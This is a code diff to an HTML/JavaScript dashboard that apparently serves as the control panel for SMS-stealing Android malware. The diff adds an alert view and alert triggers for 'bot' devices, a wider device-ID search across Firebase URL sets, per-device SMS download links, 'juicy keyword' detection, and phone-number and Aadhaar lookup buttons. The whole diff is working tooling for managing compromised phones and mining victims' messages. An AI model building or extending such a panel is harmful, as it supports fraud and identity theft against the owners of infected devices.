@@ -215,7 +215,7 @@
     <button class="mode-btn"        id="btn-old" onclick="switchMode('old')">📦 Old URLs</button>
   </div>
   <div class="search-bar">
-    <input type="text" id="search-input" placeholder="Search URL or host…">
+    <input type="text" id="search-input" placeholder="Search URL or Device ID…">
     <button class="btn btn-ghost" id="refresh-btn" onclick="refreshUrlList()">↻ Refresh</button>
   </div>
 </header>
@@ -244,6 +244,11 @@
         <div class="hc-title">Edit Keywords</div>
         <div class="hc-sub">Manage juicy keyword<br>detection list</div>
       </div>
+      <div class="home-card" onclick="openAlertDevicesView()">
+        <div class="hc-icon">🔔</div>
+        <div class="hc-title">On Alert Devices</div>
+        <div class="hc-sub" id="alert-devices-home-sub">Loading…</div>
+      </div>
     </div>
   </div>
 
@@ -252,6 +257,18 @@
     <div class="stats-bar" id="stats-bar"></div>
     <div class="device-filters" id="sort-bar"></div>
     <div class="url-grid" id="url-grid">
+      <div class="loading"><div class="spinner"></div><br>Loading…</div>
+    </div>
+  </div>
+
+  <!-- ── On Alert Devices view ── -->
+  <div id="view-alert-devices" style="display:none;padding:0">
+    <div class="back-btn" onclick="showHome()" style="padding:16px 20px 0">← Back to Home</div>
+    <div style="padding:12px 20px 0;display:flex;align-items:center;gap:10px">
+      <h2 style="font-size:16px">🔔 On Alert Devices</h2>
+      <button class="btn btn-ghost" onclick="openAlertDevicesView()" style="font-size:12px">↻ Refresh</button>
+    </div>
+    <div id="alert-devices-body" style="padding:12px 20px">
       <div class="loading"><div class="spinner"></div><br>Loading…</div>
     </div>
   </div>
@@ -395,8 +412,11 @@ function showHome() {
   document.getElementById('view-home').classList.add('active');
   document.getElementById('view-urls').classList.remove('active');
   document.getElementById('view-devices').classList.remove('active');
+  document.getElementById('view-alert-devices').style.display = 'none';
   document.getElementById('mode-toggle').style.display = 'none';
   document.getElementById('total-badge').textContent = '—';
+  // Refresh alert devices count on home
+  _refreshAlertDevicesCount();
 }
 
 // ── Sort helpers ──────────────────────────────────────────────────────────────
@@ -559,14 +579,18 @@ function renderUrls(urls) {
 
 document.getElementById('search-input').addEventListener('input', async () => {
   const q = document.getElementById('search-input').value.trim();
-  // If query looks like a device ID (hex chars, ≥8 chars), do global device search
-  if (/^[0-9a-f]{8,}$/i.test(q)) {
+  // Device ID search: hex chars ≥8, or any non-empty query with ≥6 chars (broader match)
+  // Works from home page, URL list, or alert devices view
+  if (q.length >= 6 && /^[0-9a-f]{6,}$/i.test(q)) {
     await searchDeviceGlobal(q);
   } else {
     document.getElementById('device-search-results').style.display = 'none';
-    document.getElementById('url-grid').style.display = '';
-    document.getElementById('sort-bar').style.display = '';
-    renderUrls(allUrls);
+    // Only restore url-grid if we're in view-urls
+    if (document.getElementById('view-urls').classList.contains('active')) {
+      document.getElementById('url-grid').style.display = '';
+      document.getElementById('sort-bar').style.display = '';
+      renderUrls(allUrls);
+    }
   }
 });
 
@@ -856,31 +880,38 @@ async function saveNotes() {
 
 // ── Global Device Search ──────────────────────────────────────────────────────
 async function searchDeviceGlobal(q) {
-  // Hide URL grid, show results panel
+  // Hide URL grid, show results panel — works from any view
+  document.getElementById('view-home').classList.remove('active');
+  document.getElementById('view-alert-devices').style.display = 'none';
+  document.getElementById('view-devices').classList.remove('active');
+  document.getElementById('view-urls').classList.add('active');
+  document.getElementById('mode-toggle').style.display = '';
   document.getElementById('url-grid').style.display = 'none';
   document.getElementById('sort-bar').style.display = 'none';
   const panel = document.getElementById('device-search-results');
   const info  = document.getElementById('device-search-info');
   const grid  = document.getElementById('device-search-grid');
   panel.style.display = 'block';
-  info.textContent = `🔍 Searching for device "${q}" across all URLs…`;
+  info.textContent = `🔍 Searching for device "${q}" across New + Old + PP URLs…`;
   grid.innerHTML = '<div class="loading"><div class="spinner"></div></div>';
 
   try {
     const res  = await fetch(`/api/search/device/${encodeURIComponent(q)}`);
     const data = await res.json();
     if (!data.results.length) {
-      info.textContent = `🔍 No devices found matching "${q}"`;
+      info.textContent = `🔍 No devices found matching "${q}" in any URL set`;
       grid.innerHTML = '';
       return;
     }
     info.textContent = `🔍 Found ${data.results.length} device(s) matching "${q}"`;
     const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    const setLabel = s => s === 'pp' ? '🔵 PP' : s === 'old' ? '📦 Old' : '🆕 New';
     grid.innerHTML = data.results.map(d => `
       <div class="url-card" style="cursor:default;margin-bottom:8px">
         <div class="url-card-header">
           <span class="url-id" style="font-size:14px">#${d.urlId}</span>
           <span class="url-host">${d.url.replace('https://','').replace('-default-rtdb.firebaseio.com','')}</span>
+          <span class="badge-sm badge-blue" style="margin-left:4px;font-size:10px">${setLabel(d.urlSet)}</span>
           <span class="badge-sm ${d.status==='online'?'badge-green':'badge-red'}" style="margin-left:auto">${d.status}</span>
         </div>
         <div style="font-size:12px;color:var(--muted);margin:4px 0">
@@ -895,7 +926,7 @@ async function searchDeviceGlobal(q) {
         ${d.juicyKeywords.length ? `<div class="tag-juicy" style="margin-top:6px">🎯 ${d.juicyKeywords.join(', ')}</div>` : ''}
         <div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap">
           <a class="sms-btn" href="${esc(d.smsLink)}" target="_blank">📥 SMS</a>
-          <button class="sms-btn" onclick="openUrl(${d.urlId})">👁️ View URL</button>
+          <button class="sms-btn" onclick="switchMode('${d.urlSet}');openUrl(${d.urlId})">👁️ View URL</button>
           <button class="sms-btn" onclick="openSearchno(event,${d.urlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">📞</button>
           <button class="sms-btn" onclick="openSearchaadhar(event,${d.urlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">🪪</button>
           <button class="sms-btn" onclick="openNotes(event,${d.urlId},'${d.deviceId}')">📝</button>
@@ -1527,9 +1558,74 @@ function _showAlertLoadError() {
   setTimeout(() => el.remove(), 8000);
 }
 
+// ── On Alert Devices view ─────────────────────────────────────────────────────
+async function openAlertDevicesView() {
+  document.getElementById('view-home').classList.remove('active');
+  document.getElementById('view-urls').classList.remove('active');
+  document.getElementById('view-devices').classList.remove('active');
+  document.getElementById('view-alert-devices').style.display = 'block';
+  document.getElementById('mode-toggle').style.display = 'none';
+  document.getElementById('total-badge').textContent = '—';
+
+  const body = document.getElementById('alert-devices-body');
+  body.innerHTML = '<div class="loading"><div class="spinner"></div><br>Loading…</div>';
+
+  try {
+    const res  = await fetch('/api/alert-devices');
+    const data = await res.json();
+    document.getElementById('total-badge').textContent = `${data.total} alert(s)`;
+
+    if (!data.total) {
+      body.innerHTML = '<p style="color:var(--muted);padding:20px 0">No devices are under alert mode yet. Click 🔔 on any device to set up alerts.</p>';
+      return;
+    }
+
+    const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    const setLabel = s => s === 'pp' ? '🔵 PP' : s === 'old' ? '📦 Old' : '🆕 New';
+    const triggerLabel = t => t === 'device_online' ? '🟢 Online' : t === 'device_offline' ? '🔴 Offline' : '📩 SMS';
+
+    body.innerHTML = `
+      <div class="url-grid">
+        ${data.results.map(d => `
+          <div class="url-card" style="cursor:default">
+            <div class="url-card-header">
+              <span class="url-id" style="font-size:13px">🔔</span>
+              <span class="url-host"><code style="color:var(--text);font-size:11px">${esc(d.deviceId)}</code></span>
+              <span class="badge-sm ${d.status==='online'?'badge-green':d.status==='offline'?'badge-red':''}" style="margin-left:auto;font-size:10px">${esc(d.status)}</span>
+            </div>
+            <div class="url-metrics" style="margin-bottom:8px">
+              <div class="metric"><div class="k">Brand</div><div class="v" style="font-size:12px">${esc(d.brand)}</div></div>
+              <div class="metric"><div class="k">URL Set</div><div class="v" style="font-size:12px">${setLabel(d.urlSet)}</div></div>
+              <div class="metric"><div class="k">Bot</div><div class="v" style="font-size:12px">${esc(d.botName)}</div></div>
+              <div class="metric"><div class="k">Last Activity</div><div class="v" style="font-size:11px">${d.lastActivity||'—'}</div></div>
+            </div>
+            <div style="display:flex;flex-wrap:wrap;gap:4px;margin-bottom:6px">
+              ${d.triggers.map(t => `<span class="badge-sm badge-blue" style="font-size:10px">${triggerLabel(t)}</span>`).join('')}
+            </div>
+            <div style="font-size:11px;color:var(--muted)">SIM1: ${esc(d.sim1)}</div>
+          </div>`).join('')}
+      </div>`;
+  } catch (e) {
+    body.innerHTML = `<p style="color:var(--red)">Error loading alert devices: ${e.message}</p>`;
+  }
+}
+
+async function _refreshAlertDevicesCount() {
+  try {
+    const res  = await fetch('/api/alert-devices');
+    const data = await res.json();
+    const sub  = document.getElementById('alert-devices-home-sub');
+    if (sub) sub.textContent = data.total > 0
+      ? `${data.total} device(s) monitored`
+      : 'No alerts configured yet';
+  } catch { /* silent */ }
+}
+
+// Refresh alert count when home page loads
+_refreshAlertDevicesCount();
+
 // ── Integration: wrap openUrl to load alert configs ───────────────────────────
-const _origOpenUrl = openUrl;
-openUrl = async function(id) {
+const _origOpenUrl = openUrl;openUrl = async function(id) {
   await _origOpenUrl.call(this, id);
   loadAlertConfigsForUrlSet();
 };
